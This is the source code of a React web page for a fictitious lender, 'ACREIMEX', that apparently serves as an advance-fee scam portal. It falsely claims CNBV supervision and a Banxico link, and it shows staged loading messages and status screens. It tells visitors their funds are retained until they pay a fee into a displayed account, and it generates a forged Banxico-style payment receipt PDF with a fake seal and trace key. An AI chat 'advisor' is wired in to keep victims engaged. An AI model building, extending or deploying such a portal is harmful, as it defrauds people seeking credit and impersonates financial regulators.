
"use client";

import React, { useState, useEffect, useRef } from 'react';
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { ScrollArea } from '@/components/ui/scroll-area';
import { 
  Loader2, Search, CheckCircle, ShieldCheck, AlertTriangle, 
  Clock, Receipt, Lock, Download, Banknote, ShieldAlert, 
  FileText, ExternalLink, UserCheck, MessageSquare, X, Send, Bot,
  Info, Headset, ArrowLeft, Home, RefreshCw, ClipboardCheck
} from 'lucide-react';
import { useToast } from "@/hooks/use-toast";
import { useFirebase, useMemoFirebase, useDoc } from '@/firebase';
import { doc } from 'firebase/firestore';
import Link from 'next/link';
import { jsPDF } from 'jspdf';
import autoTable from 'jspdf-autotable';
import QRCode from 'qrcode';
import { askSupport } from '@/ai/flows/support-flow';
import { cn } from '@/lib/utils';

type TransferData = {
  id: string;
  recipientName: string;
  bankName: string;
  amount: number;
  destinationCard: string;
  timestamp: string;
  chargeConcept: string;
  chargeAmount: number;
  estado_pago_cargo: 'pendiente' | 'pagado';
  estado_transferencia: 'retenida' | 'liberada' | 'pendiente_liberacion' | 'en_espera_liberacion';
  cuenta_pago_cargo: {
    banco: string;
    titular: string;
    cuenta: string;
  };
};

type Step = 'search' | 'retention_notice' | 'payment_pending' | 'charge_paid' | 'pending_liberation_notice' | 'en_espera_notice' | 'success' | 'loading_screen';

export default function TrackingPage() {
  const [step, setStep] = useState<Step>('search');
  const [loadingMsg, setLoadingMsg] = useState('');
  const [searchFolio, setSearchFolio] = useState('');
  const [isSearching, setIsSearching] = useState(false);
  const [activeFolio, setActiveFolio] = useState<string | null>(null);

  const [isChatOpen, setIsChatOpen] = useState(false);
  const [chatMessages, setChatMessages] = useState<{role: 'user' | 'bot', text: string}[]>([
    {role: 'bot', text: '¡Hola! Bienvenido al Centro de Atención ACREIMEX. Soy su asesor personal. ¿En qué puedo apoyarle con su trámite hoy?'}
  ]);
  const [userMessage, setUserMessage] = useState('');
  const [isAiThinking, setIsAiThinking] = useState(false);
  const scrollRef = useRef<HTMLDivElement>(null);

  const { firestore } = useFirebase();
  const { toast } = useToast();

  const transferRef = useMemoFirebase(() => {
    if (!activeFolio) return null;
    return doc(firestore, 'users', 'admin', 'transfers', activeFolio);
  }, [firestore, activeFolio]);

  const { data: currentTransfer, isLoading: isDocLoading } = useDoc<TransferData>(transferRef);

  useEffect(() => {
    if (activeFolio && !isDocLoading && currentTransfer) {
      if (step === 'loading_screen') {
        if (currentTransfer.estado_transferencia === 'liberada') {
          setStep('success');
        } else if (currentTransfer.estado_transferencia === 'pendiente_liberacion') {
          setStep('pending_liberation_notice');
        } else if (currentTransfer.estado_transferencia === 'en_espera_liberacion') {
          setStep('en_espera_notice');
        } else if (currentTransfer.estado_pago_cargo === 'pagado') {
          setStep('charge_paid');
        } else {
          setStep('retention_notice');
        }
      } else {
        if (currentTransfer.estado_transferencia === 'liberada' && step !== 'success') {
          setStep('success');
        } else if (currentTransfer.estado_transferencia === 'pendiente_liberacion' && step !== 'pending_liberation_notice') {
          setStep('pending_liberation_notice');
        } else if (currentTransfer.estado_transferencia === 'en_espera_liberacion' && step !== 'en_espera_notice') {
          setStep('en_espera_notice');
        } else if (currentTransfer.estado_pago_cargo === 'pagado' && step === 'payment_pending') {
          setStep('charge_paid');
        }
      }
    }
  }, [currentTransfer, isDocLoading, activeFolio, step]);

  useEffect(() => {
    if (scrollRef.current) {
      const scrollElement = scrollRef.current.querySelector('[data-radix-scroll-area-viewport]');
      if (scrollElement) {
        scrollElement.scrollTop = scrollElement.scrollHeight;
      }
    }
  }, [chatMessages]);

  const resetSearch = () => {
    setStep('search');
    setActiveFolio(null);
    setSearchFolio('');
  };

  async function handleTrackFolio() {
    if (!searchFolio) return;
    setIsSearching(true);
    setStep('loading_screen');
    
    const messages = [
      "Conectando con servidores seguros ACREIMEX...",
      "Autenticando protocolos de seguridad Nivel 4...",
      "Analizando status del cliente para liberación...",
      "Sincronizando con base de datos central de Banxico..."
    ];

    let msgIndex = 0;
    const interval = setInterval(() => {
      if (msgIndex < messages.length) {
        setLoadingMsg(messages[msgIndex]);
        msgIndex++;
      }
    }, 4500);

    setTimeout(() => {
      clearInterval(interval);
      const cleanFolio = searchFolio.trim().toUpperCase();
      setActiveFolio(cleanFolio);
      setIsSearching(false);
    }, 18000);
  }

  const handleSendMessage = async () => {
    if (!userMessage.trim() || isAiThinking) return;

    const newMessage = userMessage;
    setUserMessage('');
    setChatMessages(prev => [...prev, {role: 'user', text: newMessage}]);
    setIsAiThinking(true);

    try {
      const response = await askSupport({
        message: newMessage,
        transferContext: currentTransfer ? {
          id: currentTransfer.id,
          recipientName: currentTransfer.recipientName,
          chargeConcept: currentTransfer.chargeConcept,
          chargeAmount: currentTransfer.chargeAmount,
          amount: currentTransfer.amount,
          bankName: currentTransfer.bankName,
          estado_transferencia: currentTransfer.estado_transferencia
        } : undefined
      });
      setChatMessages(prev => [...prev, {role: 'bot', text: response.response}]);
    } catch (error) {
      setChatMessages(prev => [...prev, {role: 'bot', text: 'Disculpe, tenemos una alta saturación en los servidores. Por favor intente en un momento. después de este requisito se libera tu línea de crédito.'}]);
    } finally {
      setIsAiThinking(false);
    }
  };

  const downloadReceipt = async () => {
    if (!currentTransfer) return;
    
    const pdf = new jsPDF();
    const pageWidth = pdf.internal.pageSize.getWidth();
    const date = new Date();
    const formattedDate = date.toLocaleDateString('es-MX', { day: '2-digit', month: '2-digit', year: 'numeric' });
    const formattedTime = date.toLocaleTimeString('es-MX', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
    const traceKey = `ACX${Math.floor(Math.random() * 1000000000000000000)}`;

    pdf.setFillColor(20, 30, 45);
    pdf.rect(0, 0, pageWidth, 45, 'F');
    
    pdf.setTextColor(255, 255, 255);
    pdf.setFontSize(26);
    pdf.setFont("helvetica", "bold");
    pdf.text("ACREIMEX", 20, 25);
    
    pdf.setFontSize(9);
    pdf.setFont("helvetica", "normal");
    pdf.text("SOCIEDAD FINANCIERA DE OBJETO MÚLTIPLE", 20, 32);
    pdf.text("ENTIDAD REGULADA POR LA CNBV", 20, 36);
    
    pdf.text("COMPROBANTE ELECTRÓNICO DE PAGO (CEP)", pageWidth - 20, 20, { align: 'right' });
    pdf.setFontSize(11);
    pdf.setFont("helvetica", "bold");
    pdf.text(`FOLIO: ${currentTransfer.id}`, pageWidth - 20, 28, { align: 'right' });
    pdf.setFontSize(8);
    pdf.setFont("helvetica", "normal");
    pdf.text(`CLAVE DE RASTREO: ${traceKey}`, pageWidth - 20, 35, { align: 'right' });

    pdf.setTextColor(20, 30, 45);
    pdf.setFontSize(14);
    pdf.setFont("helvetica", "bold");
    pdf.text("CERTIFICACIÓN DE DISPERSIÓN DE FONDOS", 20, 60);
    pdf.line(20, 62, pageWidth - 20, 62);

    autoTable(pdf, {
      startY: 70,
      head: [['Concepto Bancario', 'Información de la Operación']],
      body: [
        ['Institución Emisora', 'ACREIMEX S.A. DE C.V.'],
        ['Tipo de Operación', 'SPEI (Sistema de Pagos Electrónicos Interbancarios)'],
        ['Fecha de Aplicación', formattedDate],
        ['Hora de Liquidación', formattedTime],
        ['Beneficiario', currentTransfer.recipientName.toUpperCase()],
        ['Institución Receptora', currentTransfer.bankName.toUpperCase()],
        ['Cuenta / CLABE Destino', currentTransfer.destinationCard],
        ['Monto Dispersado', `$${Number(currentTransfer.amount).toLocaleString('es-MX', {minimumFractionDigits: 2})} MXN`],
        ['Estatus Final', 'APLICADO / LIBERACIÓN TOTAL'],
        ['Concepto de Pago', currentTransfer.chargeConcept.toUpperCase()],
      ],
      theme: 'grid',
      headStyles: { fillColor: [20, 30, 45], textColor: [255, 255, 255], fontStyle: 'bold' },
      styles: { fontSize: 8, cellPadding: 4 },
      columnStyles: { 0: { fontStyle: 'bold', width: 65, fillColor: [245, 245, 245] } }
    });

    const finalY = (pdf as any).lastAutoTable.finalY;

    const qrData = `https://www.banxico.org.mx/cep/`;
    const qrDataUri = await QRCode.toDataURL(qrData);
    
    pdf.addImage(qrDataUri, 'PNG', pageWidth - 55, finalY + 15, 35, 35);
    
    pdf.setFontSize(7);
    pdf.setTextColor(120);
    pdf.setFont("helvetica", "bold");
    pdf.text("ESCANEÉ PARA VALIDACIÓN OFICIAL", pageWidth - 20, finalY + 55, { align: 'right' });
    pdf.text("EN EL PORTAL DE BANXICO", pageWidth - 20, finalY + 59, { align: 'right' });

    pdf.setFont("courier", "normal");
    pdf.setFontSize(6);
    const digitalSeal = `||ACREIMEX|${currentTransfer.id}|${formattedDate}|${formattedTime}|${currentTransfer.amount}|${traceKey}|CNBV|BANXICO|SPEI|CERTIFICADO||`;
    pdf.text("SELLO DIGITAL DE AUTENTICIDAD BANCARIA:", 20, finalY + 15);
    pdf.text(digitalSeal, 20, finalY + 20, { maxWidth: pageWidth - 70 });

    pdf.setFont("helvetica", "italic");
    pdf.setFontSize(7);
    pdf.setTextColor(160);
    const disclaimer = "Este documento es una representación impresa de un Comprobante Electrónico de Pago emitido bajo las normativas vigentes del Banco de México (Banxico) y supervisado por la Comisión Nacional Bancaria y de Valores (CNBV). La validez de esta transferencia es definitiva e irrevocable una vez emitida esta certificación. ACREIMEX S.A. DE C.V. garantiza la dispersión total de los activos aquí descritos. después de este requisito se libera tu línea de crédito.";
    pdf.text(disclaimer, 20, finalY + 80, { maxWidth: pageWidth - 40, align: 'justify' });

    pdf.save(`COMPROBANTE_OFICIAL_ACX_${currentTransfer.id}.pdf`);
  };

  const Logo = () => (
    <div className="flex items-center justify-center mb-4 cursor-pointer" onClick={resetSearch}>
      <div className="w-20 h-20 bg-slate-800 rounded-3xl flex items-center justify-center shadow-2xl border-4 border-slate-700">
        <span className="text-white font-bold text-3xl">AC</span>
      </div>
    </div>
  );

  return (
    <main className="min-h-screen bg-slate-100 flex flex-col items-center p-4 py-8 space-y-8 relative">
      <header className="w-full max-w-4xl flex justify-between items-center px-4">
        <div className="flex items-center gap-3 cursor-pointer" onClick={resetSearch}>
            <div className="w-10 h-10 bg-slate-800 rounded-xl flex items-center justify-center shadow-lg">
                <span className="text-white font-bold text-sm">AC</span>
            </div>
            <span className="font-bold text-xl text-slate-800 tracking-tight uppercase">ACREIMEX</span>
        </div>
        <div className="flex gap-2">
          {step !== 'search' && (
            <Button variant="outline" size="sm" onClick={resetSearch} className="rounded-xl border-slate-200">
              <Home className="w-4 h-4 mr-2" /> Inicio
            </Button>
          )}
          <Button variant="ghost" size="sm" asChild className="rounded-xl text-slate-400 hover:text-slate-800">
              <Link href="/admin"><Lock className="w-4 h-4 mr-2" /> Personal Autorizado</Link>
          </Button>
        </div>
      </header>

      <Card className="w-full max-w-md shadow-2xl rounded-[3rem] overflow-hidden border-none bg-white">
        <CardHeader className="bg-slate-800 text-white text-center py-12 relative overflow-hidden">
          <div className="absolute top-0 right-0 p-4 opacity-10">
            <ShieldCheck className="w-32 h-32" />
          </div>
          <Logo />
          <CardTitle className="text-2xl font-black uppercase tracking-tighter">Portal de Seguridad</CardTitle>
          <CardDescription className="text-slate-400 font-bold text-[10px] uppercase tracking-[0.3em]">Validación de Activos Nivel 4</CardDescription>
        </CardHeader>
        <CardContent className="p-8">
          
          {step === 'loading_screen' && (
            <div className="py-16 text-center space-y-8">
                <div className="relative w-24 h-24 mx-auto">
                    <div className="absolute inset-0 rounded-full border-4 border-slate-100 border-t-slate-800 animate-spin"></div>
                    <Lock className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-8 h-8 text-slate-800" />
                </div>
                <h3 className="text-lg font-black text-slate-800 uppercase tracking-widest animate-pulse">{loadingMsg}</h3>
            </div>
          )}

          {step === 'search' && (
            <div className="space-y-10 py-6">
                <div className="space-y-4">
                    <label className="text-[10px] font-black text-slate-500 uppercase tracking-widest ml-1">Referencia de Folio ACREIMEX</label>
                    <div className="flex gap-3">
                        <Input 
                            placeholder="ACX-XXXXXXXX" 
                            value={searchFolio} 
                            onChange={(e) => setSearchFolio(e.target.value.toUpperCase())}
                            className="rounded-2xl border-slate-200 h-16 text-lg font-mono font-bold"
                        />
                        <Button onClick={handleTrackFolio} disabled={isSearching || !searchFolio} className="rounded-2xl h-16 w-16 bg-slate-800">
                            {isSearching ? <Loader2 className="w-6 h-6 animate-spin" /> : <Search className="w-6 h-6" />}
                        </Button>
                    </div>
                </div>
                {activeFolio && !currentTransfer && !isSearching && !isDocLoading && (
                    <div className="p-4 bg-red-50 text-red-600 rounded-2xl text-xs text-center font-bold">
                        FOLIO NO ENCONTRADO EN LA BASE DE DATOS CENTRAL
                    </div>
                )}
                <div className="p-6 bg-slate-50 rounded-[2rem] border border-dashed border-slate-200 flex flex-col items-center text-center gap-3">
                    <div className="w-12 h-12 bg-white rounded-full flex items-center justify-center shadow-sm">
                        <Info className="w-6 h-6 text-slate-400" />
                    </div>
                    <p className="text-[10px] text-slate-400 font-bold uppercase tracking-wider leading-relaxed">
                        Solo el personal con folio autorizado puede visualizar el estatus de la dispersión de fondos.
                    </p>
                </div>
            </div>
          )}

          {step === 'retention_notice' && currentTransfer && (
              <div className="space-y-6 text-center animate-in slide-in-from-bottom-10">
                  <div className="relative inline-block">
                    <div className="w-20 h-20 bg-amber-50 rounded-[2rem] flex items-center justify-center mx-auto border-2 border-amber-200">
                        <AlertTriangle className="w-10 h-10 text-amber-600" />
                    </div>
                  </div>
                  <div className="space-y-1">
                    <h2 className="text-2xl font-black text-slate-800 leading-none uppercase">Trámite Retenido</h2>
                    <p className="text-[10px] text-slate-400 font-black uppercase tracking-widest">Protocolo de Seguridad ACREIMEX</p>
                  </div>

                  <div className="p-6 bg-slate-50 rounded-3xl border border-slate-100 text-left space-y-4 shadow-sm relative overflow-hidden">
                    <div className="absolute top-0 right-0 p-2">
                        <UserCheck className="w-8 h-8 text-slate-200" />
                    </div>
                    <div className="space-y-1">
                        <p className="text-[9px] font-black text-slate-400 uppercase tracking-tighter">Beneficiario Autorizado</p>
                        <p className="text-lg font-black text-slate-900 uppercase leading-none">{currentTransfer.recipientName}</p>
                    </div>
                    <div className="flex justify-between items-end">
                        <div className="space-y-1">
                            <p className="text-[9px] font-black text-slate-400 uppercase tracking-tighter">Monto en Proceso de Liberación</p>
                            <p className="text-2xl font-black text-blue-700">${currentTransfer.amount.toLocaleString()} MXN</p>
                        </div>
                        <div className="px-3 py-1 bg-blue-100 rounded-lg">
                            <span className="text-[8px] font-black text-blue-700 uppercase">Trámite Seguro</span>
                        </div>
                    </div>
                  </div>

                  <div className="p-4 bg-amber-50 rounded-2xl border border-amber-100 text-xs text-slate-700 font-bold leading-relaxed">
                    Para la liberación inmediata de estos fondos, es obligatorio cubrir el pago de: <span className="underline font-black text-slate-900">{currentTransfer.chargeConcept}</span>.
                  </div>

                  <div className="bg-slate-900 p-6 rounded-[2.5rem] text-left space-y-4 shadow-xl">
                      <div className="flex justify-between border-b border-white/10 pb-2">
                        <span className="text-slate-500 text-[10px] font-bold uppercase tracking-widest">Liquidación Requerida</span>
                        <span className="font-black text-amber-400">${currentTransfer.chargeAmount.toLocaleString()} MXN</span>
                      </div>
                      <div className="space-y-2 text-white">
                          <p className="text-[9px] text-slate-500 font-bold uppercase">Cuenta de Depósito Autorizada</p>
                          <div className="p-3 bg-white/5 rounded-xl border border-white/10">
                            <p className="font-bold text-xs text-slate-400 mb-1">{currentTransfer.cuenta_pago_cargo.banco}</p>
                            <p className="font-bold text-sm mb-2">{currentTransfer.cuenta_pago_cargo.titular}</p>
                            <div className="flex items-center justify-between">
                                <p className="text-amber-400 font-mono font-black text-lg">{currentTransfer.cuenta_pago_cargo.cuenta}</p>
                                <Button size="sm" variant="ghost" className="h-6 text-[8px] text-slate-400 hover:text-white" onClick={() => {
                                    navigator.clipboard.writeText(currentTransfer.cuenta_pago_cargo.cuenta);
                                    toast({ title: "Copiado", description: "CLABE copiada al portapapeles." });
                                }}>COPIAR</Button>
                            </div>
                          </div>
                      </div>
                  </div>

                  <div className="grid grid-cols-1 gap-4 mt-4">
                    <Button onClick={() => setStep('payment_pending')} className="w-full bg-slate-800 h-20 rounded-2xl font-black text-xl shadow-lg hover:scale-[1.02] transition-all flex items-center justify-center gap-3">
                        <Banknote className="w-6 h-6 text-amber-400" /> REGISTRAR PAGO AHORA
                    </Button>
                    <Button 
                        variant="default" 
                        onClick={() => setIsChatOpen(true)}
                        className="w-full h-16 rounded-2xl bg-blue-600 hover:bg-blue-700 text-white font-black text-sm uppercase tracking-widest flex items-center justify-center gap-3 shadow-xl border-4 border-white"
                    >
                        <Headset className="w-6 h-6 animate-pulse" /> HABLAR CON UN ASESOR EN VIVO
                    </Button>
                  </div>
              </div>
          )}

          {step === 'en_espera_notice' && currentTransfer && (
              <div className="space-y-8 text-center py-6 animate-in slide-in-from-bottom-10">
                  <div className="w-24 h-24 bg-blue-50 rounded-[2.5rem] flex items-center justify-center mx-auto border-2 border-blue-200">
                      <ClipboardCheck className="w-12 h-12 text-blue-600" />
                  </div>
                  <div className="space-y-2">
                    <h2 className="text-2xl font-black text-slate-800 uppercase leading-none">Folio Validado</h2>
                    <p className="text-[10px] text-slate-400 font-bold uppercase tracking-widest">Documentación y Datos Correctos</p>
                  </div>

                  <div className="p-6 bg-slate-50 rounded-3xl border border-slate-200 text-left space-y-4">
                    <p className="text-xs text-slate-700 font-bold leading-relaxed">
                        Estimado(a) <span className="text-slate-900 font-black">{currentTransfer.recipientName}</span>, le informamos que su expediente ha sido aprobado satisfactoriamente por nuestro departamento de riesgos.
                    </p>
                    <div className="p-4 bg-white rounded-2xl border border-slate-100 space-y-3">
                        <div className="flex items-center gap-3">
                            <RefreshCw className="w-4 h-4 text-amber-500 animate-spin-slow" />
                            <span className="text-[10px] font-black uppercase text-slate-800">Estatus: En Cola de Dispersión</span>
                        </div>
                        <p className="text-[10px] text-slate-500 leading-relaxed">
                            Debido a la alta demanda en el procesamiento de liquidaciones interbancarias, su folio se encuentra en turno para su dispersión masiva.
                        </p>
                        <div className="pt-2 border-t border-slate-50">
                            <p className="text-[9px] font-black text-amber-600 uppercase">Tiempo estimado: 2 a 72 Horas Hábiles</p>
                        </div>
                    </div>
                  </div>

                  <div className="bg-slate-900 p-6 rounded-[2rem] text-white shadow-xl">
                      <p className="text-[10px] font-black uppercase opacity-60 mb-2">Aviso de Procesamiento</p>
                      <p className="text-xs font-medium leading-relaxed italic">
                        "Su trámite ya está en curso y su lugar en el sistema SPEI está garantizado. Agradecemos su paciencia mientras completamos el protocolo de seguridad."
                      </p>
                  </div>

                  <Button 
                      variant="default" 
                      onClick={() => setIsChatOpen(true)}
                      className="w-full h-16 rounded-2xl bg-blue-600 hover:bg-blue-700 text-white font-black text-sm uppercase tracking-widest flex items-center justify-center gap-3 shadow-xl border-4 border-white"
                  >
                      <Headset className="w-6 h-6 animate-pulse" /> CONSULTAR CON UN ASESOR
                  </Button>
                  
                  <p className="text-[9px] text-slate-400 font-bold uppercase italic">
                    después de este requisito se libera tu línea de crédito.
                  </p>
              </div>
          )}

          {step === 'pending_liberation_notice' && currentTransfer && (
              <div className="space-y-8 text-center py-6 animate-in zoom-in">
                  <div className="w-24 h-24 bg-blue-50 rounded-[2.5rem] flex items-center justify-center mx-auto border-2 border-blue-200">
                      <RefreshCw className="w-12 h-12 text-blue-600 animate-spin-slow" />
                  </div>
                  <div className="space-y-2">
                    <h2 className="text-2xl font-black text-blue-800 uppercase leading-none">Proceso de Dispersión</h2>
                    <p className="text-[10px] text-slate-400 font-bold uppercase tracking-widest">Validación de Liquidación Interbancaria</p>
                  </div>

                  <div className="p-6 bg-slate-50 rounded-3xl border border-slate-200 text-left space-y-4">
                    <div className="flex items-start gap-3">
                        <div className="w-8 h-8 bg-blue-100 rounded-full flex items-center justify-center shrink-0">
                            <Clock className="w-4 h-4 text-blue-600" />
                        </div>
                        <div className="space-y-1">
                            <p className="text-[11px] text-slate-800 font-black uppercase">Estatus: En validación SPEI</p>
                            <p className="text-[10px] text-slate-500 font-medium leading-relaxed">
                                Estamos procesando la liquidación final de su línea de crédito. Este proceso requiere validaciones de red interbancaria SPEI para asegurar la transferencia segura de sus activos.
                            </p>
                        </div>
                    </div>
                    <div className="p-4 bg-white rounded-2xl border border-slate-100 space-y-2">
                        <div className="flex justify-between items-center text-[9px] font-black uppercase text-slate-400">
                            <span>Progreso de Transferencia</span>
                            <span className="text-blue-600">85%</span>
                        </div>
                        <div className="h-2 bg-slate-100 rounded-full overflow-hidden">
                            <div className="h-full bg-blue-600 w-[85%] animate-pulse"></div>
                        </div>
                    </div>
                  </div>

                  <div className="bg-blue-600 p-6 rounded-[2rem] text-white space-y-2 shadow-lg">
                      <p className="text-[10px] font-black uppercase opacity-80">Mensaje de Institución</p>
                      <p className="text-xs font-bold leading-relaxed italic">
                        "Estamos trabajando en su liberación final. Agradecemos su paciencia mientras se completa la dispersión segura de sus fondos."
                      </p>
                  </div>

                  <Button 
                      variant="outline" 
                      onClick={() => setIsChatOpen(true)}
                      className="w-full h-14 rounded-2xl border-2 border-blue-200 text-blue-700 font-black text-xs uppercase tracking-widest flex items-center justify-center gap-2"
                  >
                      <MessageSquare className="w-4 h-4" /> Consultar con Asesor Senior
                  </Button>
                  
                  <p className="text-[9px] text-slate-400 font-bold uppercase italic px-4">
                    después de este requisito se libera tu línea de crédito.
                  </p>
              </div>
          )}

          {step === 'payment_pending' && (
              <div className="space-y-12 text-center py-10 animate-in fade-in">
                  <div className="relative w-32 h-32 mx-auto">
                    <div className="absolute inset-0 rounded-full border-2 border-slate-100 border-t-blue-600 animate-spin"></div>
                    <div className="absolute inset-0 flex items-center justify-center">
                        <Banknote className="w-12 h-12 text-slate-300" />
                    </div>
                  </div>
                  <div className="space-y-4">
                    <h2 className="text-2xl font-black text-slate-800 uppercase leading-none">Validación en Proceso</h2>
                    <p className="text-[11px] text-slate-500 font-medium px-6 uppercase tracking-wider leading-relaxed">
                        El sistema ACREIMEX está monitoreando la red interbancaria SPEI en busca de la confirmación de fondos. La liberación se activará automáticamente al detectar el pago.
                    </p>
                  </div>
                  <div className="flex flex-col gap-3">
                    <Button variant="outline" onClick={() => setStep('retention_notice')} className="text-[10px] font-black uppercase text-slate-500 tracking-widest rounded-xl h-12">
                      Ver Instrucciones de Depósito
                    </Button>
                  </div>
              </div>
          )}

          {step === 'charge_paid' && currentTransfer && (
              <div className="space-y-10 text-center py-6 animate-in zoom-in">
                  <div className="w-24 h-24 bg-green-50 rounded-[2.5rem] flex items-center justify-center mx-auto border-2 border-green-200 shadow-inner">
                      <Receipt className="w-12 h-12 text-green-600" />
                  </div>
                  <div className="space-y-2">
                    <h2 className="text-2xl font-black text-green-800 uppercase leading-none">Pago Confirmado</h2>
                    <p className="text-[10px] text-slate-400 font-bold uppercase tracking-widest">Recibo de Honorarios Emitido</p>
                  </div>
                  <div className="bg-green-50/50 border-2 border-green-100 p-6 rounded-[2rem] text-left">
                      <p className="text-[10px] text-green-800 font-black mb-2 uppercase">Verificación Exitosa</p>
                      <p className="text-xs text-green-700 font-bold leading-relaxed">
                        Se ha validado satisfactoriamente el depósito de <span className="text-green-900 font-black">${currentTransfer.chargeAmount.toLocaleString()} MXN</span>. Los fondos de la dispersión están siendo procesados. después de este requisito se libera tu línea de crédito.
                      </p>
                  </div>
                  <div className="flex flex-col items-center gap-4">
                    <Loader2 className="animate-spin text-green-600 w-10 h-10" />
                    <span className="text-[10px] font-black text-slate-400 uppercase tracking-widest">Iniciando dispersión final de fondos...</span>
                  </div>
              </div>
          )}

          {step === 'success' && currentTransfer && (
              <div className="space-y-10 text-center py-6 animate-in slide-in-from-bottom-10">
                  <div className="w-24 h-24 bg-green-100 rounded-full flex items-center justify-center mx-auto shadow-2xl border-4 border-white">
                    <CheckCircle className="w-16 h-16 text-green-500" />
                  </div>
                  <h2 className="text-3xl font-black text-slate-800 leading-none">Dispersión Exitosa</h2>
                  <div className="bg-slate-50 p-6 rounded-[2.5rem] space-y-4 text-left border border-slate-100 shadow-sm">
                      <div className="flex justify-between border-b border-slate-200 pb-2"><span className="text-slate-400 text-[9px] font-bold uppercase">Beneficiario</span><span className="font-black text-slate-800 text-xs uppercase">{currentTransfer.recipientName}</span></div>
                      <div className="flex justify-between border-b border-slate-200 pb-2"><span className="text-slate-400 text-[9px] font-bold uppercase">Monto Liberado</span><span className="font-black text-green-600 text-xl">${Number(currentTransfer.amount).toLocaleString()} MXN</span></div>
                      <div className="flex justify-between border-b border-slate-200 pb-2"><span className="text-slate-400 text-[9px] font-bold uppercase">Banco Destino</span><span className="font-black text-slate-800 text-xs uppercase">{currentTransfer.bankName}</span></div>
                  </div>
                  <div className="grid grid-cols-1 gap-4">
                    <Button onClick={downloadReceipt} className="bg-slate-800 text-white rounded-2xl h-16 font-black text-lg shadow-lg flex items-center justify-center gap-3">
                        <Download className="h-5 w-5" /> Descargar Comprobante Bancario
                    </Button>
                    <Button variant="outline" onClick={resetSearch} className="rounded-2xl h-12 font-bold text-slate-600">
                      Realizar Nueva Consulta
                    </Button>
                  </div>
              </div>
          )}
        </CardContent>
      </Card>
      
      <footer className="text-slate-400 text-[10px] font-bold uppercase tracking-[0.3em] text-center pb-8 flex flex-col gap-2">
          <span>ACREIMEX S.A. DE C.V. © {new Date().getFullYear()}</span>
          <span className="text-slate-300">Entidad Financiera Bajo Supervisión Bancaria</span>
      </footer>

      <div className="fixed bottom-6 right-6 z-50 flex flex-col items-end gap-4">
        {isChatOpen && (
          <Card className="w-[350px] sm:w-[400px] h-[550px] shadow-2xl rounded-[2.5rem] flex flex-col border-none overflow-hidden animate-in slide-in-from-bottom-10 ring-4 ring-white">
            <CardHeader className="bg-slate-800 text-white p-6 flex flex-row items-center justify-between">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 bg-blue-600 rounded-xl flex items-center justify-center shadow-lg border-2 border-white/20">
                  <Bot className="w-6 h-6 text-white" />
                </div>
                <div>
                  <CardTitle className="text-sm font-black uppercase tracking-tighter">Atención ACREIMEX</CardTitle>
                  <p className="text-[9px] text-blue-400 font-black uppercase">Asesor Personal Senior</p>
                </div>
              </div>
              <Button variant="ghost" size="icon" onClick={() => setIsChatOpen(false)} className="text-slate-400 hover:text-white rounded-full">
                <X className="w-5 h-5" />
              </Button>
            </CardHeader>
            <CardContent className="flex-1 overflow-hidden p-0 flex flex-col bg-slate-50">
              <ScrollArea className="flex-1 p-6" ref={scrollRef}>
                <div className="space-y-6">
                  {chatMessages.map((msg, i) => (
                    <div key={i} className={cn("flex flex-col max-w-[90%]", msg.role === 'user' ? "ml-auto items-end" : "items-start")}>
                      <div className={cn(
                        "p-4 rounded-[1.5rem] text-xs font-bold leading-relaxed shadow-sm",
                        msg.role === 'user' ? "bg-slate-800 text-white rounded-tr-none" : "bg-white text-slate-800 rounded-tl-none border border-slate-200"
                      )}>
                        {msg.text}
                      </div>
                    </div>
                  ))}
                  {isAiThinking && (
                    <div className="flex items-center gap-3 text-blue-600 font-black text-[10px] uppercase tracking-widest px-2">
                      <Loader2 className="w-4 h-4 animate-spin" /> Revisando sistema...
                    </div>
                  )}
                </div>
              </ScrollArea>
              <div className="p-4 bg-white border-t-2 border-slate-100 flex gap-3">
                <Input 
                  placeholder="Escriba su mensaje aquí..." 
                  value={userMessage}
                  onChange={(e) => setUserMessage(e.target.value)}
                  onKeyDown={(e) => e.key === 'Enter' && handleSendMessage()}
                  className="rounded-2xl border-slate-200 h-12 text-xs font-bold px-4 focus:ring-blue-500"
                />
                <Button onClick={handleSendMessage} disabled={isAiThinking} size="icon" className="bg-slate-800 rounded-2xl shrink-0 h-12 w-12 shadow-lg">
                  <Send className="w-5 h-5" />
                </Button>
              </div>
            </CardContent>
          </Card>
        )}
        <Button 
          onClick={() => setIsChatOpen(!isChatOpen)}
          className={cn(
            "w-20 h-20 rounded-full shadow-2xl flex items-center justify-center hover:scale-105 transition-all border-4 border-white",
            isChatOpen ? "bg-slate-800" : "bg-blue-600 animate-bounce"
          )}
        >
          {isChatOpen ? <X className="w-10 h-10 text-white" /> : <MessageSquare className="w-10 h-10 text-white" />}
        </Button>
      </div>
    </main>
  );
}
